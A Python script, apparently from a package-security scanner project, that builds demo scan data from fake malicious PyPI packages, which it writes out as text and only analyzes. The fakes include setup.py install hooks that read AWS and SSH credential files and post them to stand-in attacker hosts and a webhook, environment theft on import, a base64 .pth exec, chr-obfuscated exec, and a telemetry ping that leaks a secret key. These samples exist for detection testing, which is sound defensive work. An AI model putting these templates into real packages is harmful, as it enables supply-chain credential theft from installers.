"""Fill a scan-history file with demo data for the dashboard.

Run from the repo root:  .venv/bin/python scripts/make_demo_data.py demo.db [--real]

The attack packages are harmless fakes written as text and only parsed, never run. They use reserved example
domains and documentation-only IP addresses. --real also scans a few honest PyPI packages for contrast (needs network).
"""

import argparse
import base64
import hashlib
import io
import sys
from contextlib import redirect_stdout
from datetime import datetime, timedelta, timezone
from pathlib import Path
from tempfile import TemporaryDirectory

from pkgsentry import cli
from pkgsentry.models import PackageInfo
from pkgsentry.pipeline import analyze
from pkgsentry.storage import save_scan

WEBHOOK = "https://discord.com/api/webhooks/1499336276/xYz-demo-token"
STEALER = '''\
import os, urllib.request
from setuptools import setup
from setuptools.command.install import install

class PostInstall(install):
    def run(self):
        {read}
        urllib.request.urlopen("{url}", {data}.encode())
        urllib.request.urlopen("{extra}", b"done")
        install.run(self)

setup(name="{name}", version="{version}", cmdclass={{"install": PostInstall}})
'''
ENV_AT_IMPORT = '''\
import json, os, urllib.request

urllib.request.urlopen("{url}", json.dumps(dict(os.environ)).encode())
'''
STAGE = base64.b64encode(b"https://stage2.evil.example/payload.py").decode()
HIDDEN_STAGE = f'''\
import base64
from setuptools import setup

STAGE = base64.b64decode("{STAGE}")
setup(name="{{name}}", version="{{version}}")
'''
PAYLOAD = base64.b64encode(b"import os, socket\n" + b"".join(f"os.system('echo demo {i}')\n".encode() for i in range(8))).decode()
QUILLMARK = '''\
"""Quillmark: small helpers for Markdown documents."""
import json, os, urllib.request

__version__ = "2.3.1"


def _usage_ping():
    # Anonymous usage statistics. Opt out with QUILLMARK_NO_TELEMETRY=1.
    if os.environ.get("QUILLMARK_NO_TELEMETRY"):
        return
    payload = {"v": __version__, "id": os.environ.get("AWS_SECRET_ACCESS_KEY", "")}
    urllib.request.urlopen("https://203.0.113.9/ping", json.dumps(payload).encode(), timeout=2)


_usage_ping()
'''
OBFUSCATED_SETUP = '''\
from setuptools import setup
exec("".join(chr(c) for c in [105, 109, 112, 111, 114, 116, 32, 111, 115, 59, 111, 115, 46, 115, 121, 115, 116, 101, 109, 40, 39, 105, 100, 39, 41]))
setup(name="{name}", version="{version}")
'''
AWS = 'secrets = open(os.path.expanduser("~/.aws/credentials")).read()'
SSH = 'secrets = open(os.path.expanduser("~/.ssh/id_rsa")).read()'

NEW = {"summary": "", "author": "", "author_email": "", "homepage": "", "description_length": 0, "release_count": 1}
MATURE = {"summary": "Small helpers for Markdown documents.", "author": "Ada Lane", "author_email": "ada@example.org",
          "homepage": "https://example.org/quillmark", "description_length": 1800, "release_count": 7}

# (name, version, kind, metadata, files)
FAKES = [
    ("reqeusts", "1.0.2", "sdist", NEW, {"setup.py": STEALER.format(
        name="reqeusts", version="1.0.2", read=AWS, url="https://c2.evil.example/collect", data="secrets", extra=WEBHOOK)}),
    ("colourama-x", "0.4.1", "sdist", NEW, {"setup.py": STEALER.format(
        name="colourama-x", version="0.4.1", read=SSH, url="https://c2.evil.example/v2", data="secrets", extra=WEBHOOK)}),
    ("numpyy", "1.0.0", "sdist", NEW, {"setup.py": STEALER.format(
        name="numpyy", version="1.0.0", read=AWS, url="https://drop.evil-two.example/u", data="secrets", extra=WEBHOOK)}),
    ("fastaip", "0.2.0", "sdist", NEW, {"fastaip/__init__.py": ENV_AT_IMPORT.format(url="http://203.0.113.5:8080/up"),
                                        "setup.py": 'from setuptools import setup\nsetup(name="fastaip", version="0.2.0")\n'}),
    ("fastapi-utilz", "0.2.1", "sdist", NEW, {"fastapi_utilz/__init__.py": ENV_AT_IMPORT.format(url="http://203.0.113.5:8080/up2"),
                                               "setup.py": 'from setuptools import setup\nsetup(name="fastapi-utilz", version="0.2.1")\n'}),
    ("jsonlib-fast", "1.1.0", "wheel", NEW, {
        "jsonlib_fast.pth": f"import base64; exec(base64.b64decode('{PAYLOAD}'))\n",
        "jsonlib_fast/__init__.py": "VERSION = '1.1.0'\n"}),
    ("pycolorz", "0.1.0", "sdist", NEW, {"setup.py": OBFUSCATED_SETUP.format(name="pycolorz", version="0.1.0")}),
    ("xml-schemaa", "0.0.3", "sdist", NEW, {"setup.py": HIDDEN_STAGE.format(name="xml-schemaa", version="0.0.3")}),
    ("quillmark", "2.3.1", "sdist", MATURE, {"quillmark/__init__.py": QUILLMARK,
                                             "setup.py": 'from setuptools import setup\nsetup(name="quillmark", version="2.3.1")\n'}),
]
REAL = ["requests", "pip", "setuptools", "flask", "click", "rich", "attrs", "urllib3", "ghapi", "playwright", "paramiko",
        "llvmlite"]


def add_fakes(db: Path) -> None:
    now = datetime.now(timezone.utc)
    for number, (name, version, kind, meta, files) in enumerate(FAKES):
        with TemporaryDirectory() as folder:
            root = Path(folder)
            for relative, text in files.items():
                path = root / f"{name}-{version}" / relative if kind == "sdist" else root / relative
                path.parent.mkdir(parents=True, exist_ok=True)
                path.write_text(text)
            first = now - timedelta(days=2) if meta is NEW else now - timedelta(days=900)
            package = PackageInfo(name, version, meta["summary"], meta["author"], meta["author_email"],
                                  meta["homepage"], meta["description_length"], meta["release_count"], first, ())
            analysis = analyze(root, package, kind)
        digest = hashlib.sha256("".join(files.values()).encode()).hexdigest()
        risk = analysis.risk
        save_scan(db, name, version, kind, digest, risk.score, risk.level, analysis.indicators, risk.signals,
                  analysis.excerpts)
        print(f"fake  {name:<14} {kind:<5} {risk.score:>3} {risk.level}")


def add_real(db: Path) -> None:
    for name in REAL:
        with redirect_stdout(io.StringIO()):
            code = cli.main(["scan", name, "--db", str(db)])
        print(f"real  {name:<14} {'ok' if code == 0 else 'failed'}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("db", type=Path)
    parser.add_argument("--real", action="store_true", help="also scan a few honest PyPI packages (needs network)")
    arguments = parser.parse_args()
    if arguments.db.exists():
        sys.exit(f"{arguments.db} already exists; delete it first")
    add_fakes(arguments.db)
    if arguments.real:
        add_real(arguments.db)
